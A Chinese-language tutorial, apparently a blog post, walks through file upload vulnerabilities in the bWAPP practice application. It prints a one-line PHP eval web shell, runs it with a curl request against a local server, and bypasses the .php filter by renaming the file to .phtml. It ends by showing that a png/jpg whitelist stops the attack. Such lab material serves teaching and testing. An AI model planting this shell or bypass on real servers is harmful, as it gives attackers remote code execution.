# 文件上传漏洞

以 bWAPP 环境下的 Unrestricted File Upload 为例，来看文件上传是如何导致安全问题的。

## bWAPP 基础

bWAPP, buggy web application, 该程序中集成了各种常见漏洞，目的是作为漏洞测试的演练场，为 web 安全爱好者和开发人员提供一个测试平台。

其安装和登入不再赘述。

## php 的一句话漏洞

在 php 中，提供了诸如 `evel` 的函数，其作用就是将参数作为 php 代码解析并执行。

新建脚本文件 file.php:

```php
<?php @eval($_POST['hacker']); ?>
```

之后，将该文件上传到 bWAPP 内，流程为：

![上传过程](https://img-blog.csdnimg.cn/20210618111741721.gif)

> 页面上方出现 test 字段，表明上传成功

此时，需要注意，我们选定的安全等级为 low:

![安全等级为 low](https://img-blog.csdnimg.cn/20210618111900314.png)

随后，访问本地内 bWAPP 下的 images/file.php 路径：

![上传文件的路径](https://img-blog.csdnimg.cn/20210618112037320.png)

可见，文件已经上传成功。

## 用 curl 来 post 数据

现在，漏洞就已经出现了，bWAPP 上有了一段能执行任何 php 代码的函数，因此，可以对其发送请求，进而获取服务器上的内容：

```bash
curl -d "hacker=echo getcwd();" http://127.0.0.1/images/file.php
# -d 表示为 post data
# hacker= 是因为 file.php 读取的是 hacker 下的字段
# getcwd 为获取当前工作目录的函数
```

![执行结果](https://img-blog.csdnimg.cn/20210618112547564.png)

可见，上述代码执行完成，成功获取了服务器当前的工作目录。

## 提高安全等级

如果将安全等级提高到 middle, 则会拦截所有的 php 文件上传：

![拦截 php 文件上传](https://img-blog.csdnimg.cn/2021061811284611.png)

此时，看似没有办法上传 php 文件了，其实并非如此。

## 后缀名绕过

思考下列问题：

- 问题 1: 服务器是如何判断当前文件类型的？

答：依据文件后缀。

- 问题 2: 服务器是如何解析文件的？

答：依照服务器配置文件。（所谓解析文件，例如 .css 文件，服务器会将其认为是需要处理的文件交给浏览器解析，而不是一串字符串）

bWAPP 的 web server 为 apache, 它对文件解析的配置文件位于以下目录：

![apache 文件解析的配置](https://img-blog.csdnimg.cn/20210618113319606.png)

红框部分标注出 php 文件的解析规则，查看可知，只要满足 `.+\.ph(p[345]?|t|tml)$` 后缀的都会按照 php 文件来处理。

![匹配规则](https://img-blog.csdnimg.cn/20210618113450581.png)

那么，后缀名绕过的实现原理便可以归结为：将 file.php 后缀更改为 phtml（它依旧满足正则要求，因此可以被服务器认定为 php 文件），但它绕过 .php 后缀限制。

就此，我们将 file.phtml 上传，随后执行 curl 请求，结果为：

![结果](https://img-blog.csdnimg.cn/20210618113837850.png)

可见，成功绕过了后缀名限制。

## 将安全等级调到最高

将安全等级调成最高，之后上传 file.phtml, 其结果为：

![只支持 png, jpg 文件](https://img-blog.csdnimg.cn/2021061812081073.png)

可见，此时文件上传功能以白名单的形式，限制只能上传 png 和 jpg 格式的文件。

此时，文件格式的限制，因此无法同时满足内容为 php 代码和服务器解析执行 php 代码两个部分，因此无法实现漏洞攻击。
